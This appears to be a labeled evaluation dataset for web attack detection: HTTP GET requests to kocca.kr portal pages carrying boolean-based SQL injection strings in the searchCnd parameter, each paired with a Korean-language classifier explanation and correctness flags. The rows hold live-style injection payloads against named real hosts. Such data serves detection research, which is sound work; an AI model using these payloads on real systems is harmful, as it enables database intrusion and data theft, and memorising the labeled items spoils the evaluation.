Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
3043,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%201943%3D1943%20AND%20%28%28%285784%3D5784&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%201943%3D1943%20AND%20%28%28%285784%3D5784&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\n
공격 유형 : SQL Injection (SQL 인젝션)
이유 : URL의 searchCnd 파라미터에 SQL Injection 공격 코드가 포함되어 있습니다. 이를 통해 데이터베이스에 악의적인 쿼리를 주입할 수 있는 보안 취약점이 존재합니다."
7924,"GET /portal/bbs/list/B0000204.do?searchCnd=%29%20AND%202451%3D2451%20AND%20%288540%3D8540&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\r\nReferer: http://bestgame.kocca.kr:80/portal/bbs/list/B0000204.do\r\nHost: bestgame.kocca.kr\r\nCookie: KCSESSIONID=RyRLgt7ptTh19xNyHSHGnrRY5j7jhq5XrCGz2yP3H4WhR0Hs0QGL!1739629523!965280821\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/list/B0000204.do?searchCnd=%29%20AND%202451%3D2451%20AND%20%288540%3D8540&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1
공격 유형 : SQL Injection
이유 : URL의 searchCnd 파라미터에 SQL Injection 공격에 사용되는 특수 문자가 포함되어 있음."
23373,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%29%20AND%209998%3D8227%20AND%20%28%28%28%22wNEw%22%20LIKE%20%22wNEw&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20110518 Firefox/4.0.1\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=RGhmgkPdM6RfnKQFBSjyJ2xLpYDLKSpLZpQXHfynfyN7QbnhB1Dh!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%29%20AND%209998%3D8227%20AND%20%28%28%28%22wNEw%22%20LIKE%20%22wNEw&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1

공격 유형 : SQL Injection (SQL 인젝션)

이유 : GET 요청의 쿼리 파라미터인 searchCnd에 SQL Injection 공격 코드가 포함되어 있습니다. 이를 통해 악의적인 사용자가 데이터베이스에 대한 민감한 정보를 노출시키거나 데이터베이스를 조작할 수 있으므로 보안 상 위험한 요청입니다."
3249,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%20WHERE%206713%3D6713%20AND%208553%3D8372--%20Fihb&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"이 Payload는 SQL Injection 공격을 시도하는 것으로 보입니다.

공격 여부(0:비공격, 1:공격) : 1 (공격)
공격 구문 : WHERE 6713=6713 AND 8553=8372
공격 유형 : SQL Injection
이유 : URL의 searchCnd 파라미터에 SQL Injection 공격 코드가 포함되어 있습니다. 사용자 입력을 검증 또는 필터링하지 않고 직접 SQL 쿼리에 삽입하여 시스템에 악의적인 명령을 주입하려는 시도입니다. 이를 통해 데이터베이스의 정보를 빼내거나 조작하는 등의 공격이 가능합니다."
19899,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%20AND%201276%3D8653%20AND%20%28%22PYaM%22%20LIKE%20%22PYaM&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%20AND%201276%3D8653%20AND%20%28%22PYaM%22%20LIKE%20%22PYaM&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1
공격 유형 : SQL Injection (SQL 삽입)
이유 : URL에서 searchCnd 매개변수에 SQL Injection을 시도하는 쿼리가 포함되어 있으며, 이는 악의적인 목적으로 데이터베이스를 조작하려는 시도일 수 있습니다."
22208,"GET /portal/bbs/list/B0000204.do?searchCnd=%27%29%29%20AND%208325%3D8325%20AND%20%28%28%27gqnQ%27%3D%27gqnQ&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=203026&categorys=3&subcate=312&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=57 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Linux Mint/6 (Felicia) Firefox/3.0.9\r\nCookie: KCSESSIONID=l2ypgstJ1TqgChLxv1FLySy6HB6Hr1Nm1S5VbL004s25qCL391Td!1739629523!965280821\r\nHost: kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"주어진 페이로드를 분석해보겠습니다.

주어진 페이로드에는 GET 요청이 포함되어 있습니다. 요청 URL에는 검색 조건(searchCnd)과 검색어(searchWrd) 등이 포함되어 있습니다. 이 중 searchCnd에 SQL Injection 공격 시도를 시도하는 부분이 있습니다. '8325%3D8325'와 같이 '='를 사용하여 서버 측의 SQL 쿼리를 변조하려는 시도가 보입니다.

따라서, 이 페이로드는 SQL Injection 공격을 시도하는 것으로 판단됩니다.

공격 여부(0:비공격, 1:공격) : 1
공격 구문 : SQL Injection (searchCnd=%27%29%29%20AND%208325%3D8325%20AND%20%28%28%27gqnQ%27%3D%27gqnQ)
공격 유형 : SQL Injection은 악의적인 사용자가 웹 응용 프로그램의 데이터베이스에 액세스하기 위해 SQL 쿼리를 주입하는 공격 유형입니다. 이를 통해 데이터베이스의 내용을 노출하거나 수정할 수 있으며, 보안에 심각한 위협을 가할 수 있습니다."
10140,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%20WHERE%206422%3D6422%20AND%205206%3D8121--%20MpOM&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : WHERE 6422=6422 AND 5206=8121

공격 유형 : SQL Injection

이유 : URL의 searchCnd 파라미터에 SQL Injection 공격을 시도하는 구문이 포함되어 있습니다. WHERE 절에 조건을 추가하여 데이터베이스를 조작하려는 시도로 판단됩니다."
1188,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%20AND%209974%3D9974%20AND%20%28%27Jcvd%27%20LIKE%20%27Jcvd&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%20AND%209974%3D9974%20AND%20%28%27Jcvd%27%20LIKE%20%27Jcvd&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1
공격 유형 : SQL Injection
이유 : URL의 searchCnd 파라미터에 SQL Injection 취약점이 존재하여 공격 시도가 있었습니다. SQL Injection은 악의적인 사용자가 데이터베이스에 액세스하여 데이터를 조회, 수정 또는 삭제하는 공격 기법 중 하나로, 이를 이용하여 데이터베이스를 조작하거나 민감한 정보를 빼내는 등의 공격이 가능합니다."
14321,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%29%20AND%209974%3D9974%20AND%20%28%28%28%22xoTH%22%20LIKE%20%22xoTH&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%29%20AND%209974%3D9974%20AND%20%28%28%28%22xoTH%22%20LIKE%20%22xoTH&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1
공격 유형 : SQL Injection 공격
이유 : URL 파라미터인 searchCnd에 SQL Injection을 시도하고 있음. 'xoTH'와 같은 조건을 비교하여 SQL Injection을 시도하고 있는 것으로 판단됨."
28211,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%20AND%209255%3D7597%20AND%20%28%287457%3D7457&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%29%20AND%209255%3D7597%20AND%20%28%287457%3D7457
공격 유형 : SQL Injection
이유 : URL에서 searchCnd 매개변수를 통해 SQL Injection 공격을 시도하고 있음. 입력값을 조작하여 데이터베이스에 액세스하려는 시도로 판단됨."
